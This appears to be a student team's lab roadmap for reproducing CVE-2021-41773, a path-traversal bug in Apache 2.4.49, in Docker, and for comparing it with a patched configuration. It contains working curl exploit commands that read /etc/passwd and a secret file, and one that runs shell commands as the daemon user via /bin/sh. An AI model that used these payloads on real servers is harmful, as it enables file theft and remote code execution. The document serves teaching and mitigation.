# CVE-2021-41773 Project Roadmap
Team: Beth Magembe, Davis Tameh, Jacob Davey

---

##  Project Goal
Recreate and exploit CVE-2021-41773 (Apache HTTP Server 2.4.49 path traversal vulnerability), demonstrate file disclosure and RCE escalation via mod_cgi, and compare against a patched configuration.

---

## Current Status
Docker environment builds  
Apache 2.4.49 runs on port 8080  
Path traversal confirmed working  
Secret file read confirmed working  
RCE via mod_cgi confirmed working  
Patched config blocks exploit with 403  

---

##  Final Directory Layout

```
CS-4277/
├── demo.sh                    - automated full demo script
├── curl-commands.sh           - individual commands for manual testing
├── README.md                  - full manual demo walkthrough
├── roadmap.md                 - this file
├── vulnerable/
│   ├── Dockerfile
│   ├── docker-compose.yml
│   ├── httpd-vulnerable.conf
│   └── cgi-bin/
│       └── printenv.cgi
└── patched/
    ├── Dockerfile
    ├── docker-compose.yml
    └── httpd-patched.conf
```

---

## Phase 1 — Confirm Vulnerable Environment 

### Steps

**1. Start the container**
```bash
cd vulnerable
docker compose up -d --build
sleep 15
```

**2. Verify Apache version**
```bash
docker exec apache-cve-2021-41773 httpd -v
```
Expected: `Server version: Apache/2.4.49`

**3. Confirm it's reachable**
```bash
curl http://localhost:8080/
```
Expected: `<html><body><h1>It works!</h1></body></html>`

### Key Config Details
The vulnerability requires two conditions, both present in `httpd-vulnerable.conf`:
- `Require all granted` on `<Directory />` — lets traversal reach any file on the system
- `mod_cgi` loaded — enables the RCE stage
- `Alias /static/ "/"` — non-CGI entry point used for file reading

### Issues We Hit & Fixed
- Missing `mod_unixd` → added `LoadModule unixd_module`
- Inline comments on `Require` lines caused Apache syntax errors → moved comments to their own lines
- `/cgi-bin/` path caused 500 for file reads (Apache tries to execute files) → used `Alias /static/` instead

### Acceptance 
- Apache version confirmed as 2.4.49
- HTTP 200 response on port 8080
- Vulnerable config active

---

## Phase 2 — Path Traversal 

CVE-2021-41773 exploits insufficient URL normalization. Apache 2.4.49 checks the encoded path (looks safe), then decodes `%2e` → `.` and resolves the final path (already escaped) — a classic TOCTOU bug.

### Commands

**Read /etc/passwd**
```bash
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```
Expected: full `/etc/passwd` contents starting with `root:x:0:0:...`

**Read the custom secret file**
```bash
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/secret_config.txt"
```
Expected: `SUPER_SECRET_DB_PASSWORD=hunter2`

**Negative control**
```bash
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/doesnotexist"
```
Expected: HTTP 404

### Why the Encoding Works
- `%2e` is URL encoding for `.`
- `.%2e/` decodes to `./` — Apache 2.4.49's normalizer misses this specific combination
- Chained four times it traverses from `/htdocs` all the way to the filesystem root
- Apache checks the encoded path (safe-looking), then decodes it (traversal already succeeded)

### Acceptance 
- /etc/passwd read successfully
- Custom secret file read successfully
- Negative control returns 404

---

## Phase 2b — RCE Escalation via mod_cgi 

With `mod_cgi` enabled, we traverse to `/bin/sh` via the CGI path and POST shell commands in the request body. Apache executes them as the `daemon` user. This is what pushed the CVE to CVSS 10.0.

### Command

```bash
curl --path-as-is \
  -d "echo Content-Type: text/plain; echo; id; whoami; hostname; uname -a" \
  "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

Expected:
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
<container-hostname>
Linux ...
```

### Why This Works
Apache's CGI handler passes the POST body as stdin to the executed program. By traversing to `/bin/sh`, Apache executes the shell directly and our POST body becomes the script. We use `/cgi-bin/` here (not `/static/`) because we specifically *want* execution.

### Acceptance
- Arbitrary command execution confirmed
- Running as `daemon` user confirmed

---

## Phase 3 — Patch & Mitigation 

### The Fix
One word changed in `httpd-patched.conf`:

```apache
# VULNERABLE:
Require all granted

# FIXED:
Require all denied
```

This makes the filesystem root default-deny. Even if a path escapes the docroot, Apache refuses to serve it.

### Test the Patch
```bash
# Stop vulnerable container
docker compose down

# Start patched container
cd ../patched
docker compose up -d --build
sleep 15

# Run the same exploit
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```
Expected: `403 Forbidden`

### Comparison Table

| Test Case | Vulnerable 2.4.49 | Patched 2.4.49 |
|---|---|---|
| Traversal → /etc/passwd | ✅ File disclosed | ❌ 403 Blocked |
| Traversal → secret file | ✅ File disclosed | ❌ 403 Blocked |
| RCE via /bin/sh POST | ✅ Command executed | ❌ 403 Blocked |
| Negative control | 404 | 404 |

### Source-Level Patch Analysis
The fix is in `server/request.c`, function `ap_normalize_path()`.
Full diff: `https://github.com/apache/httpd/commit/e150697`

- **Before**: check encoded path → decode → serve (traversal already succeeded)
- **After**: decode first → normalize → check → traversal caught before filesystem access

This is a **TOCTOU (Time Of Check / Time Of Use)** bug — the path that was checked is not the path that was used.

### Acceptance 
- 403 returned for all traversal attempts on patched config
- Same Apache 2.4.49 binary confirms this is a config issue, not just a version issue

---

## Phase 4 — Deliverables

### Final Write-Up Should Cover
- Executive summary: what CVE-2021-41773 is, CVSS 10.0, who it affects
- Lab setup: Docker, Apache 2.4.49, the two config conditions required
- Reproduction walkthrough referencing the commands above
- RCE escalation explanation
- Mitigation: the one-line fix and why it works
- Source patch analysis: ap_normalize_path and the TOCTOU explanation
- Lessons learned

### Presentation Outline
- What is CVE-2021-41773 and why it matters
- Lab architecture walkthrough
- Live demo: traversal → file read → RCE
- The one-line fix
- Source-level patch walkthrough
- Lessons learned
